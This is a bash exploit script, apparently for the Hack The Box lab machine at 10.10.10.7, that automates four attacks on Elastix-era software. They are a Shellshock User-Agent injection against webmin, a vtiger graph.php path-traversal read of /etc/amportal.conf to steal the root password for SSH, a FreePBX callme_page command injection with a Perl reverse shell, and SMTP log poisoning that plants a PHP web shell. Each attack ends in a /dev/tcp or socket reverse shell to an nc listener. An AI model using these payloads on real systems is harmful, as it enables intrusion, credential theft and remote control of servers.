#!/bin/bash

ctrl_c(){
	echo "[!] Exiting..."
	exit 1
}

trap ctrl_c INT

shellshock(){
	echo "[+] Shellshock."
	set -m &>/dev/null
    read -p "[+] LHOST: " lhost
	read -p "[+] LPORT: " lport
	nc -lvnp $lport &
    payload=$(timeout 4 curl -sk "https://10.10.10.7:10000/session_login.cgi" -A "() { :; };/bin/bash -i >& /dev/tcp/$lhost/$lport 0>&1")
    fg %1
}

lfi(){
	echo "[+] File disclosure via LFI"
	pass=$(curl -sk "https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action" | grep -oP "AMPMGRPASS=(.*)" | cut -d'=' -f 2 | tail -n 1)
	echo "[!] Wait..."
	which sshpass &>/dev/null
	if [ $? -eq 0 ]; then
		sshpass -p "$pass" ssh -oKexAlgorithms=+diffie-hellman-group-exchange-sha1 root@10.10.10.7
	else
		read -p "[+] The package 'sshpass' is not installed, do you want to install it? (yes/no) " answer
		if [ $answer == "yes" ];then
			sudo apt-get update &>/dev/null && sudo apt-get install sshpass -y &>/dev/null
			sshpass -p "$pass" ssh -oKexAlgorithms=+diffie-hellman-group-exchange-sha1 root@10.10.10.7
		else
			echo "[!] If you don't want to install the package you can just login with credentials user=root pass=$pass"
			exit 0
		fi
	fi
}


rce_vuln(){
    echo "[+] RCE via FreePBX"
    set -m &>/dev/null
    read -p "[+] LHOST: " lhost
	read -p "[+] LPORT: " lport
    nc -lvnp $lport &
    rce=$(curl -sk "https://10.10.10.7/recordings/misc/callme_page.php?action=c&callmenum=233@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%22$lhost%3a$lport%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A")
    fg %1
}

smtp_log_poisoning(){
    echo "[+] SMTP Log Poisoning and Execute via LFI to RCE"
    which swaks &>/dev/null
    if [ $? -eq 0 ]; then
        swaks --to asterisk@localhost --from wixnic@helo.htb --header "Subject: Shell" --body 'PHP code: <?php system($_REQUEST["cmd"]); ?>' --server 10.10.10.7
    else
        read -p "[+] The package 'swaks' is not installed, do you want to install it? (yes/no) " answer
        if [ $answer = "yes" ]; then
            sudo apt update &>/dev/null && sudo apt install swaks -y &>/dev/null
            swaks --to asterisk@localhost --from wixnic@helo.htb --header "Subject: Shell" --body 'PHP code: <?php system($_REQUEST["cmd"]); ?>' --server 10.10.10.7
        else
            echo "[+] You can just use another attack vector or use telnet and send this payload in a email: <?php system($_REQUEST["cmd"]); ?>' "
            exit 0
        fi
    fi 
    set -m &>/dev/null
    read -p "[+] LHOST: " lhost
	read -p "[+] LPORT: " lport
    nc -lvnp $lport &
    rce=$(timeout 4 curl -sk "https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../../var/mail/asterisk%00&module=Accounts&action" --data-urlencode "cmd=bash -i >& /dev/tcp/$lhost/$lport 0>&1")
    fg %1
}

help(){
	echo "[!] Usage: $0 -p [1-4]"
    echo "[!] Example: $0 -p 1"
    echo -e "\n1 = Shellshock\n2 = LFI File Disclosure SSH Login\n3 = RCE Vulnerability\n4 = SMTP Log Poisoning"
}

[ $# -eq 0 ] && help

while getopts 'p:' arg; do
  case "${arg}" in
    p) parameter=${OPTARG}
    if [ "$parameter" == "1" ]; then
        shellshock
	elif [ "$parameter" == "2" ]; then
		lfi
    elif [ "$parameter" == "3" ]; then
        rce_vuln
    elif [ "$parameter" == "4" ]; then
        smtp_log_poisoning
	else
		help
	fi
	;;
    *) help
	;;
  esac
done
